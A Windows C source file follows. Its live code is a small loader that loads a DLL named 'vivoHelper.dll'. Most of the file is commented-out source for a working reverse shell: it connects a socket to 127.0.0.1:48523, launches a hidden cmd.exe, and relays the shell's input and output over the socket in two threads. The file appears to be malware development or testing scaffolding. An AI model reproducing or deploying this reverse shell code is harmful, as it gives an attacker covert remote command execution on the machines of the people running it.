#include <winsock2.h>
#include <windows.h>
#include "funcs.h"
/* #define PRINTF( ... ) printf( __VA_ARGS__ ) */
#define bool BOOLEAN

#pragma comment( lib , "User32.lib" )
#pragma comment( lib , "Ws2_32.lib" )

int wmain(int argc, wchar_t* argv[]) {
  HINSTANCE hDll ;
  hDll = LoadLibraryA( "vivoHelper.dll" ) ;
  if( !hDll ) MessageBox( NULL , L"LoadLibraryA Ê§°Ü" , NULL , 0 ) ;
  getch( ) ;
  return 0 ;
}

/* typedef struct _sThreadInfo */
/* { */
/*     SOCKET Socket; */
/*     HANDLE hStdIn; */
/*     HANDLE hStdOut; */
/*     bool Stop; */
/* }sThreadInfo; */

/* typedef struct _timeval { */
/*   long tv_sec; */
/*   long tv_usec; */
/* } _timeval; */

/* DWORD WINAPI ClientSocketToShell(LPVOID lpParameter) */
/* { */
/*     sThreadInfo *ti = (sThreadInfo*) lpParameter; */

/*     BYTE buffer[1024]; */
/*     DWORD BytesWritten; */
/*     fd_set rds; */
/*     _timeval timeout; */
/*     int ret ; */

/*     while (!ti->Stop) */
/*     { */
/*         FD_ZERO(&rds); */
/*         FD_SET(ti->Socket, &rds); */

/*         timeout.tv_sec = 1; */
/*         timeout.tv_usec = 0; */

/*         ret = select(0, &rds, NULL, NULL, &timeout); */
/*         if (ret < 0) */
/*             break; */

/*         if (ret > 0) */
/*         { */
/*             ret = recv(ti->Socket, buffer, sizeof(buffer), 0); */
/*             if (ret <= 0) */
/*                 break; */

/*             if (!WriteFile(ti->hStdIn, buffer, ret, &BytesWritten, NULL)) */
/*                 break; */
/*         } */
/*     } */

/*     return 0; */
/* } */

/* DWORD WINAPI ShellToClientSocket(LPVOID lpParameter) */
/* { */
/*     sThreadInfo *ti = (sThreadInfo*) lpParameter; */
/*     int ret ; */

/*     BYTE buffer[1024]; */
/*     DWORD BytesAvailable, BytesRead; */

/*     while (!ti->Stop) */
/*     { */
/*         if (!PeekNamedPipe(ti->hStdOut, NULL, 0, NULL, &BytesAvailable, NULL)) */
/*             break; */

/*         if (BytesAvailable != 0) */
/*         { */
/*             if (!ReadFile(ti->hStdOut, buffer, min(sizeof(buffer), BytesAvailable), &BytesRead, NULL)) */
/*                 break; */

/*             ret = send(ti->Socket, buffer, BytesRead, 0); */
/*             if (ret <= 0) */
/*                 break; */
/*         } */
/*         else */
/*             Sleep(1000); */
/*     } */

/*     return 0; */
/* } */

/* int main() */
/* { */
/*   SECURITY_ATTRIBUTES saAttr;  */
/*   HANDLE hStdIn_Rd; */
/*   HANDLE hStdIn_Wr; */
/*   HANDLE hStdOut_Rd; */
/*   HANDLE hStdOut_Wr; */
/*   STARTUPINFO si; */
/*   PROCESS_INFORMATION pi; */
/*   TCHAR cmd[] = TEXT("cmd"); */
/*   sThreadInfo ti; */
/*   HANDLE Handles[3]; */
/*   DWORD dwThreadID; */
/*   DWORD ret ; */
/*   SOCKET s; */

/*   {     */
/*     WSADATA WSAData; */
/*     SOCKET AcceptedSocket; */
/*     struct sockaddr_in service; */
/*     STARTUPINFO StartupInfo; */
/*     PROCESS_INFORMATION ProcessInformation; */
/*     char ip[20] = {0} ; */
/*     char port[20] = {0} ; */
/*     int timeout = 1 ; */
/*     char lpParam[] = "127.000.000.001:48523" ; */
/*     PRINTF( "bind to %s\n" , ( char* )lpParam ) ; */
/*     memcpy( ip , ( char* )lpParam , 15 ) ; */
/*     memcpy( port , ( char* )lpParam + 16 , 5 ) ; */
/*     WSAStartup( MAKEWORD( 2 , 2 ) , &WSAData ) ; */
/*     s = WSASocketA( AF_INET , SOCK_STREAM , 0 , NULL , NULL , NULL ) ; */
/*     service.sin_family = AF_INET ; */
/*     service.sin_addr.s_addr = inet_addr( ip ) ; */
/*     service.sin_port = htons( atoi( port ) ) ; */
/*     /\* bind( s , ( SOCKADDR* )&service , sizeof( service ) ) ; *\/ */
/*     /\* listen( s , 0 ) ; *\/ */
/*     /\* AcceptedSocket = accept( s , NULL , NULL ) ; *\/ */
/*     /\* closesocket( s ) ; *\/ */
/*     connect( s , ( struct sockaddr* )&service , sizeof( service ) ) ; */
/*     setsockopt( s , SOL_SOCKET , SO_SNDTIMEO , ( char* )&timeout , sizeof( timeout ) ) ; */
/*     PRINTF( "inside BindThread loop 6\n" ) ; */
/*   } */


/*   saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);  */
/*   saAttr.bInheritHandle = TRUE;  */
/*   saAttr.lpSecurityDescriptor = NULL;  */

/*   if (!CreatePipe(&hStdOut_Rd, &hStdOut_Wr, &saAttr, 0)) */
/*     return 0; */
/*   SetHandleInformation(hStdOut_Rd, HANDLE_FLAG_INHERIT, 0); */

/*   if (!CreatePipe(&hStdIn_Rd, &hStdIn_Wr, &saAttr, 0)) */
/*   { */
/*     CloseHandle(hStdOut_Rd); */
/*     CloseHandle(hStdOut_Wr); */
/*     return 0; */
/*   } */
/*   SetHandleInformation(hStdIn_Wr, HANDLE_FLAG_INHERIT, 0); */

/*   ZeroMemory(&si, sizeof(si)); */
/*   si.cb = sizeof(si); */
/*   si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; */
/*   si.hStdError = hStdOut_Wr; */
/*   si.hStdOutput = hStdOut_Wr; */
/*   si.hStdInput = hStdIn_Rd; */
/*   si.wShowWindow = SW_HIDE; */

/*   ZeroMemory(&pi, sizeof(pi)); */

/*   if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) */
/*   { */
/*     CloseHandle(pi.hThread); */

/*     ZeroMemory(&ti, sizeof(ti)); */
/*     /\* ti.Socket = ClientSocket; *\/ */
/*     ti.Socket = s; */
/*     ti.hStdIn = hStdIn_Wr; */
/*     ti.hStdOut = hStdOut_Rd; */
/*     ti.Stop = FALSE; */

/*     ZeroMemory(Handles, sizeof(Handles)); */
/*     Handles[0] = pi.hProcess; */
/*     Handles[1] = CreateThread(NULL, 0, &ClientSocketToShell, &ti, 0, &dwThreadID); */
/*     Handles[2] = CreateThread(NULL, 0, &ShellToClientSocket, &ti, 0, &dwThreadID); */

/*     ret = WaitForMultipleObjects(3, Handles, FALSE, INFINITE); */

/*     ti.Stop = TRUE; */
/*     if (ret != WAIT_OBJECT_0) */
/*       TerminateProcess(pi.hProcess, 0); */

/*     WaitForMultipleObjects(2, &Handles[1], TRUE, INFINITE); */

/*     CloseHandle(pi.hProcess); */
/*     CloseHandle(Handles[1]); */
/*     CloseHandle(Handles[2]); */
/*   } */

/*   CloseHandle(hStdIn_Rd); */
/*   CloseHandle(hStdIn_Wr); */
/*   CloseHandle(hStdOut_Rd); */
/*   CloseHandle(hStdOut_Wr); */

/*   return 0; */
/* } */
